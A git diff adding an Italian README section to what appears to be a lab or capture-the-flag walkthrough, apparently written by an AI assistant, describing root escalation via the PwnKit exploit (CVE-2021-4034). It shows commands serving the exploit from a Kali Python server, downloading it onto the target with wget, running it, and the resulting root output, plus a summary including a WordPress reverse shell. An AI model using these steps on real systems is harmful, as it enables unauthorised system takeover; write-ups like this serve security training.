@@ -129,3 +129,66 @@ L'attacco è stato completato con successo. Le fasi principali sono state:
 
 # 🚀 **Missione completata con successo!**
 
+
+Ecco il tuo **README.MD** aggiornato con il metodo utilizzato per ottenere l'accesso root tramite **PwnKit** (32-bit), con **server Python** e **wget**.
+
+---
+
+# 4️⃣ CATTIVERIA PURA **Uso dell'Exploit PwnKit (CVE-2021-4034)**
+Per ottenere l'escalation di privilegi fino a **root**, abbiamo sfruttato la vulnerabilità **CVE-2021-4034** (PwnKit) utilizzando un exploit precompilato a 32-bit.
+
+**Passaggi Seguiti**:
+
+1. **Server HTTP su Kali per Trasferire il File**:
+   - Abbiamo avviato un server HTTP con Python nella directory contenente l'exploit:
+     ```bash
+     python3 -m http.server 8080
+     ```
+
+2. **Scaricamento dell'Exploit sul Target**:
+   - Sul target (shell **www-data**), abbiamo usato `wget` per trasferire l'exploit:
+     ```bash
+     cd /tmp
+     wget http://192.168.1.165:8080/PwnKit32 -O PwnKit32
+     chmod +x PwnKit32
+     ```
+
+3. **Esecuzione dell'Exploit**:
+   - Una volta reso eseguibile, abbiamo lanciato l'exploit:
+     ```bash
+     ./PwnKit32
+     ```
+
+4. **Verifica dell'Accesso Root**:
+   - Abbiamo verificato l'avvenuta escalation di privilegi:
+     ```bash
+     whoami
+     id
+     ```
+
+   **Output**:
+   ```
+   root
+   uid=0(root) gid=0(root) groups=0(root),33(www-data)
+   ```
+
+---
+
+## 🏆 **Accesso Root**
+L'utilizzo dell'exploit PwnKit ci ha permesso di ottenere privilegi **root** partendo da un accesso iniziale limitato all'utente **www-data**.
+
+![ROOTWITHPWNKIT](./ROOTWITHPWNKIT.png)
+
+---
+
+## 🎯 **Conclusione**
+Abbiamo ottenuto accesso completo alla macchina target partendo da una fase di **enumerazione** fino all'ottenimento dei privilegi **root**. La metodologia seguita è stata:
+
+1. Identificazione dei servizi attivi con Nmap.
+2. Accesso anonimo FTP e raccolta di informazioni.
+3. Scoperta e accesso a WordPress per ottenere una **reverse shell**.
+4. Trasferimento ed esecuzione dell'exploit **PwnKit** per ottenere root access.
+
+---
+
+🚀 **Missione completata con successo!**
